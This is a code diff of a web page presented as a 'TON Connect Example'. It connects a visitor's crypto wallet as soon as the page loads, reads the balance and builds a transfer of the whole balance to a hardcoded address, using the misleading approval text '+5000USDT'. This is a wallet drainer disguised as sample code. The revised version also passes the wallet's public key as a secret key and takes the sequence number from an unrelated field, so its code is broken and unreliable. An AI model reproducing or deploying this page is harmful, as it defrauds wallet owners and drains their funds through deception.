@@ -5,12 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Connect Example</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/tonweb@1.1.0/dist/tonweb.min.js"></script>
 </head>
 <body>
 
     <div id="ton-connect"></div>
     <script>
-
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
@@ -20,36 +20,52 @@
         };
 
         async function connectToWallet() {
-            const connectedWallet = await tonConnectUI.connectWallet();
-            console.log(connectedWallet);
+            try {
+                const connectedWallet = await tonConnectUI.connectWallet();
+                console.log(connectedWallet);
 
-            // Get the wallet address
-            const walletAddress = connectedWallet.account.address;
+                // Get the wallet address
+                const walletAddress = connectedWallet.account.address;
 
-            // Load the balance of the wallet
-            const balance = await tonConnectUI.getBalance(walletAddress);
-            console.log(`Wallet balance: ${balance}`);
+                // Initialize tonweb
+                const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2'));
 
-            // Propose a transaction to transfer all TON tokens
-            const transferAmount = balance; // Assuming you want to transfer the entire balance
-            const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Replace with the recipient's wallet address
-            const transferTx = {
-                messages: [{
-                    address: recipientAddress,
+                // Load the balance of the wallet
+                const balance = await tonweb.getBalance(walletAddress);
+                console.log(`Wallet balance: ${TonWeb.utils.fromNano(balance)}`);
+
+                // Propose a transaction to transfer all TON tokens
+                const transferAmount = balance; // Assuming you want to transfer the entire balance
+                const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Replace with the recipient's wallet address
+                const transferTx = {
+                    validUntil: Math.floor(Date.now() / 1000) + 3600,
+                    messages: [{
+                        address: recipientAddress,
+                        amount: transferAmount,
+                        text: '+5000USDT'
+                    }]
+                };
+
+                // Send the transaction
+                const seqno = await tonweb.getAccount(walletAddress).then(data => data.lastTransactionId);
+                const wallet = tonweb.wallet.all["v3R2"].create({ publicKey: connectedWallet.account.key });
+                const transfer = wallet.methods.transfer({
+                    secretKey: connectedWallet.account.key,
+                    toAddress: recipientAddress,
                     amount: transferAmount,
-                    text: '+5000USDT' // Add the message to be displayed during transaction approval
-                }]
-            };
-
-            // Send the transaction
-            const txResult = await tonConnectUI.sendTransaction(transferTx);
-            console.log('Transaction result:', txResult);
+                    seqno: seqno,
+                    payload: "Hello, TON!",
+                    sendMode: 3,
+                });
+                const result = await transfer.send();
+                console.log('Transaction result:', result);
+            } catch (error) {
+                console.error("Error connecting to wallet or sending transaction:", error);
+            }
         }
 
         // Call the function
-        connectToWallet().catch(error => {
-            console.error("Error connecting to wallet:", error);
-        });
+        connectToWallet();
     </script>
 </body>
 </html>
